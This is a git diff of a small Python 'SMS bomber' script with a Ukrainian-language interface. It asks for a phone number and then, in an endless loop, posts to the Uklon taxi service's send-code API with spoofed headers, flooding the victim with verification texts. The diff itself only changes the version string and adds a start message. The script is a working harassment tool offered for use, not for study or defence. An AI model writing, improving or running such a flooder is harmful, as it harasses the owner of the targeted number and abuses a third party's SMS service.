@@ -1,13 +1,13 @@
 import requests
 from colorama import *
 init(autoreset= True)
-version = Fore.WHITE+"1.0"
-print(Fore.GREEN+'СМС Бомбер\n')
+version = Fore.WHITE+"1.1"
+print(Fore.GREEN+'SMS Boeing ©️\n')
 print(Fore.BLUE+ "Versoin: " + version+'\n')
 print(Fore.BLUE+ "From @Valtasar\n")
 print('Введіть номер телефону в форматі "380" ')
 a = input(Fore.GREEN+ 'Номер: '+Fore.WHITE)
-
+print(Fore.GREEN+'\nЗапущено!')
 while True:
 	
 	re4 = requests.post("https://rider.uklon.com.ua/api/v1/phone/send-code", json={'username':'+' + a}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
